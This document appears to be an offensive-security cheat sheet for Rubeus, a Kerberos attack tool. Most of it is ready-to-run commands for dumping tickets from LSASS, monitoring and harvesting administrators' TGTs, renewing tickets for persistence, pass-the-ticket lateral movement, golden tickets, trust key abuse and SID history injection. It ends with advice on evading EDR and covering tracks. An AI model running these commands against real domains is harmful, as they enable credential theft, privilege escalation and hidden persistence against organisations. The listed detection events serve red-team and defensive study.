# Rubeus Ticket Harvesting and Monitoring

Documentation for ticket extraction, monitoring, renewal, and cross-domain attacks using Rubeus.

## Table of Contents

- [Ticket Enumeration](#ticket-enumeration)
- [Ticket Extraction](#ticket-extraction)
- [Ticket Monitoring](#ticket-monitoring)
- [Ticket Renewal](#ticket-renewal)
- [TGS Requests](#tgs-requests)
- [Cross-Domain Attacks](#cross-domain-attacks)
- [Ticket Analysis](#ticket-analysis)
- [OpSec Considerations](#opsec-considerations)

---

## Ticket Enumeration

### Triage - Quick Ticket Overview

List all Kerberos tickets in the current logon session:

```powershell
# Current session only
Rubeus.exe triage

# All accessible logon sessions (requires elevation)
Rubeus.exe triage /all

# Example output:
# ------------------------------------------
#  UserName                 : admin@CORP.LOCAL
#  Session                  : 0x3e7
#  StartTime                : 12/27/2025 10:30:00 AM
#  EndTime                  : 12/27/2025 8:30:00 PM
#  RenewTill                : 1/3/2026 10:30:00 AM
#  Flags                    : name_canonicalize, pre_authent, renewable, forwardable
#  ServiceName              : krbtgt/CORP.LOCAL
```

### Klist - Detailed Ticket Listing

More detailed ticket information:

```powershell
# Current session
Rubeus.exe klist

# Specific LUID
Rubeus.exe klist /luid:0x3e7

# All sessions (elevated)
Rubeus.exe klist /all

# Output in base64 format (for extraction)
Rubeus.exe klist /base64
```

### Filtering by User

```powershell
# Triage specific user's tickets
Rubeus.exe triage /user:admin

# Filter by service
Rubeus.exe triage /service:krbtgt
```

---

## Ticket Extraction

### Dump All Tickets

Extract tickets from memory (requires elevation):

```powershell
# Dump all tickets from all sessions
Rubeus.exe dump

# Dump from specific LUID
Rubeus.exe dump /luid:0x3e7

# Dump specific user's tickets
Rubeus.exe dump /user:admin

# Dump specific service tickets
Rubeus.exe dump /service:krbtgt

# Output to directory (saves as .kirbi files)
Rubeus.exe dump /outdir:C:\tickets\

# Nowrap for cleaner base64 output
Rubeus.exe dump /nowrap
```

### Extract Specific Tickets

```powershell
# Only TGTs (krbtgt tickets)
Rubeus.exe dump /service:krbtgt

# Only service tickets for specific SPN
Rubeus.exe dump /service:cifs

# Tickets from specific session
Rubeus.exe dump /luid:0x123456
```

### Dump with Server Specification

```powershell
# Dump tickets for specific server
Rubeus.exe dump /server:fileserver.corp.local
```

### Export Formats

```powershell
# Base64 (default) - Copy/paste friendly
Rubeus.exe dump /nowrap

# .kirbi files - File-based storage
Rubeus.exe dump /outdir:C:\tickets\

# Example base64 output:
# doIFNjCCBTKgAwIBBaEDAgEWoo...
```

---

## Ticket Monitoring

### Monitor - Real-time Ticket Capture

Monitor for new TGTs as users log in (requires elevation):

```powershell
# Monitor all new TGTs
Rubeus.exe monitor

# Monitor with interval (milliseconds)
Rubeus.exe monitor /interval:5000

# Monitor specific user
Rubeus.exe monitor /targetuser:admin

# Monitor and filter by domain
Rubeus.exe monitor /filteruser:corp.local

# Output to file
Rubeus.exe monitor /outfile:captured_tgts.txt

# Nowrap for cleaner output
Rubeus.exe monitor /nowrap
```

### Monitor for Specific Accounts

```powershell
# Target high-value users
Rubeus.exe monitor /targetuser:administrator /interval:5000

# Multiple targets (comma-separated)
Rubeus.exe monitor /targetuser:admin,svc_backup,domain_admin
```

### Monitor Registry for TGTs

```powershell
# Use registry key instead of polling (may be stealthier)
Rubeus.exe monitor /registry
```

### Harvest - Periodic TGT Collection

Automatically renew and harvest TGTs:

```powershell
# Harvest TGTs every 5 minutes
Rubeus.exe harvest /interval:300

# Output harvested tickets
Rubeus.exe harvest /interval:300 /outfile:harvested.txt

# Harvest with renewal (keeps tickets valid)
Rubeus.exe harvest /interval:300 /renewtickets
```

### Harvest vs Monitor

| Feature | Monitor | Harvest |
|---------|---------|---------|
| Purpose | Capture new TGTs | Collect and renew existing TGTs |
| Timing | Real-time on logon | Periodic collection |
| Renewal | No | Yes (optional) |
| Use Case | Credential theft | Maintaining access |

---

## Ticket Renewal

Renew tickets before they expire to maintain access:

### Renew TGT

```powershell
# Renew ticket from base64
Rubeus.exe renew /ticket:doIFNjCCBTK...

# Renew from file
Rubeus.exe renew /ticket:admin.kirbi

# Renew and inject
Rubeus.exe renew /ticket:admin.kirbi /ptt

# Renew and save
Rubeus.exe renew /ticket:admin.kirbi /outfile:renewed.kirbi

# Auto-renew until max renewal time
Rubeus.exe renew /ticket:admin.kirbi /autorenew
```

### Renewal Considerations

```powershell
# Check ticket renewal time
Rubeus.exe describe /ticket:admin.kirbi

# Output includes:
#   RenewTill: 1/3/2026 10:30:00 AM
#   Flags: renewable

# Tickets can only be renewed if:
# 1. "renewable" flag is set
# 2. Current time < RenewTill time
```

### Auto-Renewal Script

```powershell
# PowerShell wrapper for continuous renewal
while ($true) {
    Rubeus.exe renew /ticket:admin.kirbi /ptt
    Start-Sleep -Seconds 3600  # Renew every hour
}
```

---

## TGS Requests

Request service tickets for specific SPNs:

### Basic TGS Request

```powershell
# Request TGS with current TGT
Rubeus.exe asktgs /ticket:TGT_base64 /service:cifs/fileserver.corp.local

# Request TGS from file
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/fileserver.corp.local

# Request and inject
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/fileserver.corp.local /ptt

# Request with specific encryption
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/fileserver.corp.local /enctype:aes256
```

### Multiple Services

```powershell
# Request TGS for multiple services
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.corp.local,http/server.corp.local

# Output to files
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.corp.local,http/server.corp.local /outdir:C:\tickets\
```

### Use Current Session TGT

```powershell
# Use TGT from current session (no ticket parameter)
Rubeus.exe asktgs /service:cifs/fileserver.corp.local /ptt

# Specify user's TGT
Rubeus.exe asktgs /user:admin /service:cifs/fileserver.corp.local /ptt
```

### TGS for Cross-Realm

```powershell
# Request TGS for service in another domain
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.child.corp.local /dc:dc01.child.corp.local
```

---

## Cross-Domain Attacks

### Inter-Domain Trust Ticket Requests

```powershell
# Request referral ticket to child domain
Rubeus.exe asktgs /ticket:parent_tgt.kirbi /service:krbtgt/child.corp.local /dc:dc01.corp.local

# Use referral to access child domain resources
Rubeus.exe asktgs /ticket:referral.kirbi /service:cifs/server.child.corp.local /dc:dc01.child.corp.local /ptt
```

### Golden Ticket for Parent Domain Access

```powershell
# Create Golden Ticket with Enterprise Admins SID
Rubeus.exe golden /aes256:KRBTGT_KEY /user:admin /domain:child.corp.local /sid:S-1-5-21-child-sid /sids:S-1-5-21-parent-sid-519 /ptt

# 519 = Enterprise Admins group
# This grants access to parent domain
```

### Trust Key Abuse

```powershell
# If you have inter-realm trust key, forge trust ticket
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:TRUST_KEY /dc:dc01.child.corp.local

# Request TGS in target domain
Rubeus.exe asktgs /ticket:trust_ticket.kirbi /service:cifs/dc01.corp.local /dc:dc01.corp.local /ptt
```

### SID History Injection

```powershell
# Golden Ticket with extra SIDs
Rubeus.exe golden /aes256:KRBTGT_KEY /user:admin /domain:corp.local /sid:S-1-5-21-... /sids:S-1-5-21-otherdomain-512 /ptt

# Adds Domain Admins from another domain to ticket
```

---

## Ticket Analysis

### Describe Ticket

Parse and display ticket contents:

```powershell
# From base64
Rubeus.exe describe /ticket:doIFNjCCBTK...

# From file
Rubeus.exe describe /ticket:admin.kirbi

# Output includes:
#   UserName: admin@CORP.LOCAL
#   ServiceName: krbtgt/CORP.LOCAL
#   StartTime: 12/27/2025 10:30:00 AM
#   EndTime: 12/27/2025 8:30:00 PM
#   RenewTill: 1/3/2026 10:30:00 AM
#   Flags: name_canonicalize, pre_authent, renewable, forwardable
#   KeyType: aes256_cts_hmac_sha1_96
#   EncryptedPart: ...
```

### Decode and Analyze PAC

```powershell
# Show PAC (Privilege Attribute Certificate) details
Rubeus.exe describe /ticket:admin.kirbi /pac

# PAC contains:
#   - User SID
#   - Group memberships
#   - Logon info
#   - Signatures
```

### Ticket Validation

```powershell
# Check if ticket is valid and usable
Rubeus.exe describe /ticket:admin.kirbi

# Verify key information:
# 1. EndTime > Current time (not expired)
# 2. Flags include expected values
# 3. ServiceName matches target
```

---

## OpSec Considerations

### Detection Signatures

| Action | Event ID | Notes |
|--------|----------|-------|
| Ticket dump | 4656 | LSASS handle access |
| Monitor/Harvest | 4656 | Continuous LSASS access |
| TGS Request | 4769 | Normal Kerberos activity |
| Ticket injection | 4648 | Explicit credential logon |

### Reducing Footprint

```powershell
# Limit dump scope
Rubeus.exe dump /user:target_only  # Not /all

# Use monitor sparingly
Rubeus.exe monitor /interval:60000  # Less frequent polling

# Cleanup after operations
Rubeus.exe purge  # Remove injected tickets
```

### LSASS Access Detection

Monitoring and dumping require LSASS access, which can trigger:
- EDR alerts
- Event ID 4656 (handle to LSASS)
- Sysmon Event ID 10 (process access)

**Mitigations:**
- Use BOF versions of Rubeus functions
- Operate from higher-privilege context (SYSTEM)
- Time operations during high-activity periods

### Ticket Storage Security

```powershell
# Avoid writing tickets to disk
# Use /ptt to inject directly vs /outfile

# If files necessary, use encrypted storage
# Delete after use

# Use /nowrap for copy-paste (no file needed)
Rubeus.exe dump /service:krbtgt /nowrap
```

### Network Detection

```powershell
# Specify DC to avoid broadcast lookups
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/server.corp.local /dc:dc01.corp.local

# Use encryption matching environment
Rubeus.exe asktgt /user:admin /password:Pass123! /enctype:aes256
```

### Covering Tracks

```powershell
# Purge injected tickets when done
Rubeus.exe purge

# Avoid long-lived harvesting
# Use targeted dumps instead of continuous monitoring

# Cleanup any .kirbi files
Remove-Item C:\tickets\*.kirbi -Force
```

---

## Quick Reference

### Common Workflows

**Credential Theft (Elevated):**
```powershell
Rubeus.exe dump /service:krbtgt /nowrap > tgts.txt
```

**Lateral Movement:**
```powershell
Rubeus.exe asktgt /user:admin /rc4:HASH /ptt
dir \\target\c$
```

**Persistence via Ticket:**
```powershell
Rubeus.exe dump /service:krbtgt /outdir:C:\backup\
# Later:
Rubeus.exe renew /ticket:admin.kirbi /autorenew /ptt
```

**Monitoring High-Value Targets:**
```powershell
Rubeus.exe monitor /targetuser:administrator,domain_admin /interval:10000 /outfile:captured.txt
```

### Ticket Lifetime Reference

| Ticket Type | Default Lifetime | Renewal Period |
|-------------|------------------|----------------|
| TGT | 10 hours | 7 days |
| TGS | 10 hours | N/A (tied to TGT) |
| Golden Ticket | 10 years (forged) | 10 years |
| Silver Ticket | Service-dependent | N/A |

### Useful Flags

| Flag | Purpose |
|------|---------|
| `/ptt` | Pass-the-Ticket (inject immediately) |
| `/nowrap` | No base64 line wrapping |
| `/outfile` | Save to file |
| `/outdir` | Save multiple to directory |
| `/opsec` | Enable OpSec mode |
| `/enctype` | Specify encryption type |

---

## References

- [GhostPack Rubeus Wiki](https://github.com/GhostPack/Rubeus/wiki)
- [Kerberos Ticket Lifecycle](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [SpecterOps Kerberos Research](https://posts.specterops.io/)
